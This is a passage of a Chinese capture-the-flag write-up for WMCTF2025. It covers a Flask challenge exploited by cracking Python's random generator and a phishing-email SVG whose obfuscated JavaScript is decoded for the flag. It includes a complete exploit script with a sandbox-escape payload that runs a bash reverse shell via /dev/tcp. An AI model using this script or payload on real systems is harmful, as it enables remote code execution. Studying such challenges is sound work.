</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;user_id&#39;</span>: user[<span style=color:#e6db74>&#39;user_id&#39;</span>]
</span></span><span style=display:flex><span>    }), <span style=color:#ae81ff>200</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.post</span>(<span style=color:#e6db74>&#39;/api&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>protected_api</span>():
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>get_json()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    key1 <span style=color:#f92672>=</span> data<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;key&#39;</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> key1:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> jsonify({<span style=color:#e6db74>&#39;error&#39;</span>: <span style=color:#e6db74>&#39;key are required&#39;</span>}), <span style=color:#ae81ff>400</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    key2 <span style=color:#f92672>=</span> generate_random_string()
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> str(key1) <span style=color:#f92672>==</span> str(key2):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> jsonify({
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;message&#39;</span>: <span style=color:#e6db74>&#39;Not Allowed:&#39;</span> <span style=color:#f92672>+</span> str(key2) ,
</span></span><span style=display:flex><span>        }), <span style=color:#ae81ff>403</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> data<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;payload&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> payload:
</span></span><span style=display:flex><span>        eval(payload, {<span style=color:#e6db74>&#39;__builtin__&#39;</span>:{}})
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> jsonify({
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;message&#39;</span>: <span style=color:#e6db74>&#39;Access granted&#39;</span>,
</span></span><span style=display:flex><span>    })
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;user_id&#39;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> session:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> redirect(<span style=color:#e6db74>&#39;/login&#39;</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;index.html&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>run(host<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;0.0.0.0&#39;</span>, port<span style=color:#f92672>=</span><span style=color:#ae81ff>5001</span>)
</span></span></code></pre></div><p>用<code>random</code>生成随机数使用的是梅森旋转法，攻击脚本：<code>https://github.com/tna0y/Python-random-module-cracker</code></p><p>本题还删除了<code>builtin</code>的所有内置函数，可以直接通过继承和魔术方法重新获取<code>system</code></p><p>原脚本里需要624个生成的随机数序列来预测下一个随机数，可以通过创建624个用户的方式来获取，稍微修改一下原脚本就能写出爆破脚本，最后bash反弹shell：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> random<span style=color:#f92672>,</span> time
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> json
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> randcrack <span style=color:#f92672>import</span> RandCrack
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>random_cracker</span>():
</span></span><span style=display:flex><span>    rc <span style=color:#f92672>=</span> RandCrack()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#34;output.txt&#34;</span>, <span style=color:#e6db74>&#34;r&#34;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>        lines <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>readlines()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> line <span style=color:#f92672>in</span> lines:
</span></span><span style=display:flex><span>            rc<span style=color:#f92672>.</span>submit(int(line<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#e6db74>&#34;&#34;</span>)))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> rc
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>register</span>():
</span></span><span style=display:flex><span>    url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://49.232.42.74:31914/register&#34;</span>
</span></span><span style=display:flex><span>    user_id_list <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>624</span>):
</span></span><span style=display:flex><span>        json_data <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;username&#34;</span>: str(i), <span style=color:#e6db74>&#34;password&#34;</span>: <span style=color:#e6db74>&#34;p&#34;</span>}
</span></span><span style=display:flex><span>        resp <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url, json<span style=color:#f92672>=</span>json_data)
</span></span><span style=display:flex><span>        user_id <span style=color:#f92672>=</span> (resp<span style=color:#f92672>.</span>json())[<span style=color:#e6db74>&#39;user_id&#39;</span>]
</span></span><span style=display:flex><span>        user_id_list<span style=color:#f92672>.</span>append(user_id)
</span></span><span style=display:flex><span>        <span style=color:#75715e># print(i)</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> user_id_list
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>output</span>(user_id_list):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#34;output.txt&#34;</span>, <span style=color:#e6db74>&#34;w&#34;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> user_id <span style=color:#f92672>in</span> user_id_list:
</span></span><span style=display:flex><span>            f<span style=color:#f92672>.</span>write(user_id <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>attack</span>():
</span></span><span style=display:flex><span>    url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://49.232.42.74:31914/api&#34;</span>
</span></span><span style=display:flex><span>    rc <span style=color:#f92672>=</span> random_cracker()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>300</span>):
</span></span><span style=display:flex><span>        json_data <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;key&#34;</span>: rc<span style=color:#f92672>.</span>predict_randrange(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>4294967295</span>), <span style=color:#e6db74>&#34;payload&#34;</span>: <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;&#39;&#39;.__class__.__mro__[1].__subclasses__()[</span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74>].__init__.__globals__[&#39;system&#39;](&#39;bash -c </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#39;)&#34;</span>}
</span></span><span style=display:flex><span>        resp <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url, json<span style=color:#f92672>=</span>json_data)
</span></span><span style=display:flex><span>        <span style=color:#75715e># print(i)</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># print(resp.text)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>user_id_list <span style=color:#f92672>=</span> register()
</span></span><span style=display:flex><span>output(user_id_list)
</span></span><span style=display:flex><span>attack()
</span></span></code></pre></div><p><img alt=alt loading=lazy src=/images/WMCTF2025/1.png></p><p>参考资料：</p><p><a href=https://github.com/Luna5akura/BabyPyjail>https://github.com/Luna5akura/BabyPyjail</a></p><hr><h2 id=phishing-email>phishing email<a hidden class=anchor aria-hidden=true href=#phishing-email>#</a></h2><p>一封钓鱼邮件，在svg里嵌入了恶意javascript代码，好像是最近的技术，用<code>&lt;![CDATA[ ... ]]></code>来包装恶意代码，防止被当作XML解析，同时代码中有反调试以及大量混淆，提取关键的部分：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>encryptedParts</span> <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;4oyM4p2h77iP4p2j4oyM4p2d77iL4p2c4oyI4p2g77iN4p2a77iP4p2b4oyL4p2Y&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;4p2Z77iM4p2X77iO4p2W77iM4p2V77iK4p2U77iL4p2T77iM4p2S77iN4p2R&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;4p2Q77iL4p2P77iO4p2O77iM4p2N77iK4p2M77iL4p2L77iM4p2K77iN4p2J&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;4p2I77iL4p2H77iO4p2G77iM4p2F77iK4p2E77iL4p2D77iM4p2C77iN4p2B&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;4p2A77iL4pyx77iO4py977iM4py877iK4py777iL4py677iM4py577iN4py4&#39;</span>
</span></span><span style=display:flex><span>  ];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>stage1Results</span> <span style=color:#f92672>=</span> [];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>j</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>j</span> <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>encryptedParts</span>.<span style=color:#a6e22e>length</span>; <span style=color:#a6e22e>j</span><span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>part</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>encryptedParts</span>[<span style=color:#a6e22e>j</span>];
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Convert Unicode escape sequences to characters
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>decoded</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>part</span>.<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>/4oyM|4p2[a-zA-Z0-9]|77i[a-zA-Z0-9]/g</span>, <span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>match</span>) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>charMap</span> <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;4p2V&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;A&#39;</span>, <span style=color:#e6db74>&#39;4p2P&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;D&#39;</span>, <span style=color:#e6db74>&#39;4p2F&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;E&#39;</span>, <span style=color:#e6db74>&#39;4p2g&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;G&#39;</span>, <span style=color:#e6db74>&#39;4p2a&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;P&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;4p2c&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;S&#39;</span>, <span style=color:#e6db74>&#39;4oyI&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;V&#39;</span>, <span style=color:#e6db74>&#39;4p2T&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;a&#39;</span>, <span style=color:#e6db74>&#39;77iP&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;c&#39;</span>, <span style=color:#e6db74>&#39;4p2S&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;c&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;4p2L&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;c&#39;</span>, <span style=color:#e6db74>&#39;4p2D&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;a&#39;</span>, <span style=color:#e6db74>&#39;4p2O&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;e&#39;</span>, <span style=color:#e6db74>&#39;4p2M&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;e&#39;</span>, <span style=color:#e6db74>&#39;4p2d&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;f&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;77iO&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;g&#39;</span>, <span style=color:#e6db74>&#39;4p2b&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;h&#39;</span>, <span style=color:#e6db74>&#39;4p2Z&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;h&#39;</span>, <span style=color:#e6db74>&#39;4oyL&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;i&#39;</span>, <span style=color:#e6db74>&#39;77iM&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;i&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;4p2J&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;i&#39;</span>, <span style=color:#e6db74>&#39;4p2B&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;i&#39;</span>, <span style=color:#e6db74>&#39;4p2R&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;k&#39;</span>, <span style=color:#e6db74>&#39;4p2h&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;m&#39;</span>, <span style=color:#e6db74>&#39;4p2X&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;n&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;4p2H&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;n&#39;</span>, <span style=color:#e6db74>&#39;4pyx&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;n&#39;</span>, <span style=color:#e6db74>&#39;4p2I&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;o&#39;</span>, <span style=color:#e6db74>&#39;4p2A&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;o&#39;</span>, <span style=color:#e6db74>&#39;4p2C&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;s&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;4p2Y&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;s&#39;</span>, <span style=color:#e6db74>&#39;4p2j&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;t&#39;</span>, <span style=color:#e6db74>&#39;77iK&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;t&#39;</span>, <span style=color:#e6db74>&#39;4p2U&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;t&#39;</span>, <span style=color:#e6db74>&#39;4p2K&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;t&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;4p2N&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;t&#39;</span>, <span style=color:#e6db74>&#39;4p2E&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;v&#39;</span>, <span style=color:#e6db74>&#39;4oyM&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;w&#39;</span>, <span style=color:#e6db74>&#39;77iL&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;{&#39;</span>, <span style=color:#e6db74>&#39;4py9&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;}&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;77iN&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;_&#39;</span>, <span style=color:#e6db74>&#39;4p2W&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;_&#39;</span>, <span style=color:#e6db74>&#39;4p2Q&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;_&#39;</span>, <span style=color:#e6db74>&#39;4p2G&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;_&#39;</span>, <span style=color:#e6db74>&#39;4py8&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;!&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;4py7&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;!&#39;</span>, <span style=color:#e6db74>&#39;4py6&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;!&#39;</span>, <span style=color:#e6db74>&#39;4py5&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;!&#39;</span>, <span style=color:#e6db74>&#39;4py4&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;!&#39;</span>
</span></span><span style=display:flex><span>      };
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>charMap</span>[<span style=color:#a6e22e>match</span>] <span style=color:#f92672>||</span> <span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>    });
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>stage1Results</span>.<span style=color:#a6e22e>push</span>(<span style=color:#a6e22e>decoded</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>combined</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>stage1Results</span>.<span style=color:#a6e22e>join</span>(<span style=color:#e6db74>&#39;&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#39;Stage 1 result:&#39;</span>, <span style=color:#a6e22e>combined</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Stage 1 result: wmctwf{S4oyIG_Pch4oyLshing_iAtt{aic_k_{Dgeitte{cit_io{ng_iEtv{ais_io{4pyxg4py9i4py8t4py7{4py6i4py5_4py4
</span></span></span></code></pre></div><p>可以看到<code>result</code>里仍然有一些映射表中的键名未被映射，修改一下正则再映射一次：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>part</span> <span style=color:#f92672>=</span>  <span style=color:#e6db74>&#34;wmctwf{S4oyIG_Pch4oyLshing_iAtt{aic_k_{Dgeitte{cit_io{ng_iEtv{ais_io{4pyxg4py9i4py8t4py7{4py6i4py5_4py4&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>decoded</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>part</span>.<span style=color:#a6e22e>replace</span>(<span style=color:#e6db74>/4oyM|4p2[a-zA-Z0-9]|77i[a-zA-Z0-9]|4py[a-zA-Z0-9]|4oy[a-zA-Z0-9]/g</span>, <span style=color:#66d9ef>function</span>(<span style=color:#a6e22e>match</span>) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>charMap</span> <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;4p2V&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;A&#39;</span>, <span style=color:#e6db74>&#39;4p2P&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;D&#39;</span>, <span style=color:#e6db74>&#39;4p2F&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;E&#39;</span>, <span style=color:#e6db74>&#39;4p2g&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;G&#39;</span>, <span style=color:#e6db74>&#39;4p2a&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;P&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;4p2c&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;S&#39;</span>, <span style=color:#e6db74>&#39;4oyI&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;V&#39;</span>, <span style=color:#e6db74>&#39;4p2T&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;a&#39;</span>, <span style=color:#e6db74>&#39;77iP&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;c&#39;</span>, <span style=color:#e6db74>&#39;4p2S&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;c&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;4p2L&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;c&#39;</span>, <span style=color:#e6db74>&#39;4p2D&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;a&#39;</span>, <span style=color:#e6db74>&#39;4p2O&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;e&#39;</span>, <span style=color:#e6db74>&#39;4p2M&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;e&#39;</span>, <span style=color:#e6db74>&#39;4p2d&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;f&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;77iO&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;g&#39;</span>, <span style=color:#e6db74>&#39;4p2b&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;h&#39;</span>, <span style=color:#e6db74>&#39;4p2Z&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;h&#39;</span>, <span style=color:#e6db74>&#39;4oyL&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;i&#39;</span>, <span style=color:#e6db74>&#39;77iM&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;i&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;4p2J&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;i&#39;</span>, <span style=color:#e6db74>&#39;4p2B&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;i&#39;</span>, <span style=color:#e6db74>&#39;4p2R&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;k&#39;</span>, <span style=color:#e6db74>&#39;4p2h&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;m&#39;</span>, <span style=color:#e6db74>&#39;4p2X&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;n&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;4p2H&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;n&#39;</span>, <span style=color:#e6db74>&#39;4pyx&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;n&#39;</span>, <span style=color:#e6db74>&#39;4p2I&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;o&#39;</span>, <span style=color:#e6db74>&#39;4p2A&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;o&#39;</span>, <span style=color:#e6db74>&#39;4p2C&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;s&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;4p2Y&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;s&#39;</span>, <span style=color:#e6db74>&#39;4p2j&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;t&#39;</span>, <span style=color:#e6db74>&#39;77iK&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;t&#39;</span>, <span style=color:#e6db74>&#39;4p2U&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;t&#39;</span>, <span style=color:#e6db74>&#39;4p2K&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;t&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;4p2N&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;t&#39;</span>, <span style=color:#e6db74>&#39;4p2E&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;v&#39;</span>, <span style=color:#e6db74>&#39;4oyM&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;w&#39;</span>, <span style=color:#e6db74>&#39;77iL&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;{&#39;</span>, <span style=color:#e6db74>&#39;4py9&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;}&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;77iN&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;_&#39;</span>, <span style=color:#e6db74>&#39;4p2W&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;_&#39;</span>, <span style=color:#e6db74>&#39;4p2Q&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;_&#39;</span>, <span style=color:#e6db74>&#39;4p2G&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;_&#39;</span>, <span style=color:#e6db74>&#39;4py8&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;!&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;4py7&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;!&#39;</span>, <span style=color:#e6db74>&#39;4py6&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;!&#39;</span>, <span style=color:#e6db74>&#39;4py5&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;!&#39;</span>, <span style=color:#e6db74>&#39;4py4&#39;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;!&#39;</span>
</span></span><span style=display:flex><span>  };
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>charMap</span>[<span style=color:#a6e22e>match</span>] <span style=color:#f92672>||</span> <span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>});
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>decoded</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// wmctwf{SVG_Pchishing_iAtt{aic_k_{Dgeitte{cit_io{ng_iEtv{ais_io{ng}i!t!{!i!_!
